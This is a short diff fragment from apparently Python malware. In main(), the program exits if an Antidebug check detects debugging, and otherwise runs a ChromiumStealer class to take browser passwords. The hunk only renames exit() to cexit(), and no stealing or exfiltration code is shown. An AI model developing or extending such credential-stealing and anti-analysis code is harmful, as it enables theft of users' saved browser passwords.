@@ -117,7 +117,7 @@ def main():
         notSafe = Antidebug().isDebugMode()
         
     if notSafe:
-        exit()
+        cexit()
     else:
         if Constant.Args.browser_passwords:
             ChromiumStealer().run()
